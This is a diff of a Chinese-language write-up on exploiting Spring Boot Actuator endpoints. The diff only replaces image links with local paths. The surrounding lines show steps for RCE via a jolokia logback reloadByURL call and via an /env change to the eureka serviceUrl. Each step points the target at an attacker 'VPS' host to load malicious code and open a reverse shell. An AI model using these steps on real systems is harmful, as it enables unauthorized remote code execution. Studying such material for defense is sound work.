@@ -63,7 +63,7 @@ schema_version: "1"
 前置条件：  
 在 jolokia/list 目录检索存在 logback 组件, 则可以使用 jolokia 远程包含 logback.xml 配置文件，直接执行远程引用字节码：  
 [http://127.0.0.1:9090/jolokia/list](http://127.0.0.1:9090/jolokia/list)  
-![](https://jianfensec.com/images/2019/03/4140320665.png)
+![](../../.resource/remote/87a74e028ccdc52f24f1e97512c3b8da68f164424215ee565e40179ab3528251.png)
 
 1）在 VPS 上创建 logback.xml，logback 中填写 jndi 服务，当调用时直接触发恶意 class。
 
@@ -73,19 +73,19 @@ schema_version: "1"
 </configuration>
 ```
 
-![](https://jianfensec.com/images/2019/03/1172285257.png)
+![](../../.resource/remote/d04b4179588e834c5eb3613d706d0dff5e03b1ca4d5628e644e7c5b29f38ccb5.png)
 
 2）创建反弹 shell 的恶意 class, 并监听端口 8081  
 javac Exploit.java -> Exploit.class  
-![](https://jianfensec.com/images/2019/03/3849118789.png)  
+![](../../.resource/remote/c2067c1bdf91ba5653c9d7995b83ca24198eb40f72167a49e77ce94cfb2fff6d.png)  
 3）利用 marshalsec 创建 jndi server 地址指向恶意 class 监听的端口 8081：  
-![](https://jianfensec.com/images/2019/03/1439155234.png)  
+![](../../.resource/remote/049b89fffea382c7cc2638854726b8a49e12b13a5560f092155743970f9d69e3.png)  
 4）监听反弹 shell 端口：
 
 4）访问 springboot 以下链接触发远程访问 VPS 地址 logback.xml：  
 [http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS 地址: 8080!/logback.xml](http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS%E5%9C%B0%E5%9D%80:8080!/logback.xml)  
 触发回显 2333 端口接收到主机 whomai 结果：  
-![](https://jianfensec.com/images/2019/10/420084106.png)
+![](../../.resource/remote/f2c539b57765da26d4b39f368eec99c286b126ec78d50e1036c4b6034b7fe522.png)
 
 #### [](#2-Config-modification-via-‘-env’ "2. Config modification via ‘/env’")2. Config modification via ‘/env’
 
@@ -93,7 +93,7 @@ javac Exploit.java -> Exploit.class
 前置条件：  
 Eureka-Client <1.8.7（多见于 Spring Cloud Netflix）  
 比如测试前台 json 报错泄露包名就是使用 netflix：  
-![](https://jianfensec.com/images/2019/03/1695128671.png)  
+![](../../.resource/remote/66cd0017cb0561c04fb2a07dacdf5b4056909d1c9975ddd40f5e8567ba9aba66.png)  
 需要以下 2 个包
 
 ```
@@ -172,13 +172,13 @@ Content-Length: 68
 eureka.client.serviceUrl.defaultZone=http://vps:2333/xstream
 ```
 
-![](https://jianfensec.com/images/2019/03/134312817.png)
+![](../../.resource/remote/ac6d73fa26dffa2966c386f22986cafc256c5db7ea95f73517e700ff972c648f.png)
 
 刷新触发 [POST]：  
 **一般情况需要等待 3 秒会有响应包，如果立即返回可能是服务缺少 spring-boot-starter-actuator 扩展包无法刷新漏洞则无法利用。**  
-![](https://jianfensec.com/images/2019/03/3068556996.png)  
+![](../../.resource/remote/d430ef0523db4b799b42049cf666312c4ef72fe9a87033476f87e22b81861dd0.png)  
 获取反弹 shell：  
-![](https://jianfensec.com/images/2019/03/3495674142.png)
+![](../../.resource/remote/34bc3b41bac4d014f78063b25795809032321e26cab9a2287b5b54aa1d11aa6c.png)
 
 ### [](#安全措施可参考： "安全措施可参考：")安全措施可参考：
 
